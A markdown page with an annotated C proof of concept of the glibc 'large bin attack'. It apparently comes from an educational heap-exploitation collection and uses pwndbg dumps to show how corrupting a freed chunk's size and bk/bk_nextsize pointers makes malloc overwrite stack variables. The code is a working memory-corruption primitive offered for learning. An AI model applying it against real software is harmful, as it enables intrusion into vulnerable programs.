# Large bin Attack

```c++
/*

    This technique is taken from
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    For more details on how large-bins are handled and sorted by ptmalloc,
    please check the Background section in the aforementioned link.

    [...]

 */

#include<stdio.h>
#include<stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates large bin attack by writing a large unsigned long value into stack\n");
    fprintf(stderr, "In practice, large bin attack is generally prepared for further attacks, such as rewriting the "
           "global variable global_max_fast in libc for further fastbin attack\n\n");

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    fprintf(stderr, "Let's first look at the targets we want to rewrite on stack:\n");
    fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
    fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);

    unsigned long *p1 = malloc(0x320);
    fprintf(stderr, "Now, we allocate the first large chunk on the heap at: %p\n", p1 - 2); // p1-2 point the read addr of this chunk

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the first large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p2 = malloc(0x400);
    fprintf(stderr, "Then, we allocate the second large chunk on the heap at: %p\n", p2 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"
           " the second large chunk during the free()\n\n");
    malloc(0x20);

    unsigned long *p3 = malloc(0x400);
    fprintf(stderr, "Finally, we allocate the third large chunk on the heap at: %p\n", p3 - 2);

    fprintf(stderr, "And allocate another fastbin chunk in order to avoid consolidating the top chunk with"
           " the third large chunk during the free()\n\n");
    malloc(0x20);

    free(p1);
    free(p2);
    fprintf(stderr, "We free the first and second large chunks now and they will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p2 - 2), (void *)(p2[0]));

// pwndbg> x/16g 0x603000
// 0x603000:   0x0000000000000000  0x0000000000000331 <- p1
// 0x603010:   0x00007ffff7dd5b58  0x0000000000603360 <- fd point to large bin header, bk point to p2
// ......
// pwndbg> x/16g 0x60360
// 0x60360:    Cannot access memory at address 0x60360
// pwndbg> x/16g 0x603360
// 0x603360:   0x0000000000000000  0x0000000000000411 <- p2
// 0x603370:   0x0000000000603000  0x00007ffff7dd5b58 <- fd point to p1,bk point to large bin header
// 0x603380:   0x0000000000000000  0x0000000000000000
// 0x603390:   0x0000000000000000  0x0000000000000000
// 0x6033a0:   0x0000000000000000  0x0000000000000000
// 0x6033b0:   0x0000000000000000  0x0000000000000000
// 0x6033c0:   0x0000000000000000  0x0000000000000000
// 0x6033d0:   0x0000000000000000  0x0000000000000000
// pwndbg> unsorted
// unsortedbin
// all: 0x603360 —▸ 0x603000 —▸ 0x7ffff7dd5b58 (main_arena+88) ◂— 0x603360 /* '`3`' */
// p2.fd -> p1.fd -> 0x7ffff7dd5b58 <- p2.bk
// pwndbg>

    malloc(0x90);
// pwndbg> unsorted
// unsortedbin
// all: 0x603140 —▸ 0x7ffff7dd5b58 (main_arena+88) ◂— 0x603140 /* '@1`' */
// pwndbg> small
// smallbins
// empty
// pwndbg> large
// largebins
// 0x400 [corrupted]
// FD: 0x603360 ◂— 0x0
// BK: 0x603360 —▸ 0x6037a0 —▸ 0x7fffffffdc40 ◂— 0x6037a0
// pwndbg>
/*
1. 从 unsorted bin 中拿出最后一个 chunk（p1 属于 small bin 的范围）
2. 把这个 chunk 放入 small bin 中，并标记这个 small bin 有空闲的 chunk
3. 再从 unsorted bin 中拿出最后一个 chunk（p2 属于 large bin 的范围）
4. 把这个 chunk 放入 large bin 中，并标记这个 large bin 有空闲的 chunk
5. 现在 unsorted bin 为空，从 small bin （p1）中分配一个小的 chunk 满足请求 0x90，并把剩下的 chunk（0x330 - 0xa0）放入 unsorted bin 中
*/
    fprintf(stderr, "Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"
            " freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"
            ", and reinsert the remaining of the freed first large chunk into the unsorted bin:"
            " [ %p ]\n\n", (void *)((char *)p1 + 0x90));

    free(p3);
// pwndbg> unsorted
// unsortedbin
// all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd5b58 (main_arena+88) ◂— 0x6037a0
// pwndbg>

    fprintf(stderr, "Now, we free the third large chunk and it will be inserted in the unsorted bin:"
           " [ %p <--> %p ]\n\n", (void *)(p3 - 2), (void *)(p3[0]));

    //------------VULNERABILITY-----------

    fprintf(stderr, "Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""
            " as well as its \"bk\" and \"bk_nextsize\" pointers\n");
    fprintf(stderr, "Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"
            " at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"
            " \"bk_nextsize\" to 32 bytes before stack_var2\n\n");

    p2[-1] = 0x3f1; // size = 0x3f1
    p2[0] = 0; // fd = 0
    p2[2] = 0; // fd_nextsize = 0
    p2[1] = (unsigned long)(&stack_var1 - 2); // bk-> &stack_var1-2
    p2[3] = (unsigned long)(&stack_var2 - 4); // bck_nextsize->&stack_var2-4

    //------------------------------------

    malloc(0x90);

    fprintf(stderr, "Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."
            " During this time, targets should have already been rewritten:\n");

    fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
    fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);

    return 0;
}
```
